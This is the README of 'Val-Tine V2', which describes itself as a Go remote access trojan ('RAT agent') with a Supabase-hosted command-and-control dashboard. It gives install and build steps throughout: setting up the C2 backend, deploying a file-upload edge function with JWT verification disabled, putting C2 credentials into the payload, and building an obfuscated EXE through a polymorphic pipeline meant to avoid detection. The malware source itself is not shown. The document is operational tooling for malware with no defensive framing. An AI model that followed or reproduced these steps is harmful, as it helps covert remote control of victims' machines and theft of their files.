# Val-Tine V2

## Prerequisites

- **Go** 1.21+ — [go.dev/dl](https://go.dev/dl/)
- **Node.js** 18+ — for the web dashboard
- **Python 3.10+** — for the build tool
- **Supabase account** — [supabase.com](https://supabase.com) (free tier works)
- **Python `requests`** — `pip install requests`

Optional:
- **Supabase CLI** — for automated migrations/deploys ([install guide](https://supabase.com/docs/guides/cli))

## Quick Start

```bash
# 1. Clone
git clone <repo-url> && cd Val-Tine-V2

# 2. Install web dashboard deps
npm install

# 3. Run setup (configures everything + builds payload)
python3 setup.py
```

The setup tool will:
1. Ask for your Supabase project URL and anon key
2. Optionally configure a secondary Supabase project for redundancy
3. Update all config files (`main.go`, `.env`, `obfus.py`)
4. Run SQL migrations via Supabase CLI (if installed)
5. Deploy the `file-upload` edge function
6. Build the payload EXE using the obfuscation pipeline

## Manual Setup (without setup.py)

### 1. Create Supabase Project

Create a new project at [supabase.com](https://supabase.com/dashboard).

### 2. Run SQL Migrations

Go to **SQL Editor** in your Supabase dashboard and run these files in order:

1. `supabase/migrations/01_schema.sql` — creates tables, RLS policies, realtime
2. `supabase/migrations/02_storage.sql` — creates storage buckets and policies

### 3. Deploy Edge Function

```bash
supabase link --project-ref <your-project-ref>
supabase functions deploy file-upload --no-verify-jwt
```

Or paste `supabase/functions/file-upload/index.ts` into your Supabase dashboard Edge Functions editor.

### 4. Configure Files

Edit `main.go` — replace the placeholder C2 domain config (~line 2368):
```go
URL:    "https://YOUR-PROJECT.supabase.co",
APIKey: "YOUR-ANON-KEY",
```

Edit `.env` — for the web dashboard:
```
VITE_SUPABASE_URL="https://YOUR-PROJECT.supabase.co"
VITE_SUPABASE_PUBLISHABLE_KEY="YOUR-ANON-KEY"
```

### 5. Build Payload

```bash
python3 obfus.py
```

Or use the setup tool in build-only mode:
```bash
python3 setup.py build
```

## Web Dashboard

```bash
npm run dev
```

Opens the C2 dashboard at `http://localhost:5173`.

## Rebuild

After initial setup, rebuild the payload anytime with:

```bash
python3 setup.py build
```

## Project Structure

```
main.go              — Go payload (RAT agent)
obfus.py             — Polymorphic VM-based build pipeline
setup.py             — Interactive setup & build CLI
.env                 — Web dashboard Supabase config
src/                 — React/TypeScript web dashboard
supabase/
  migrations/        — SQL schema + storage setup
  functions/         — Edge functions (file-upload)
```
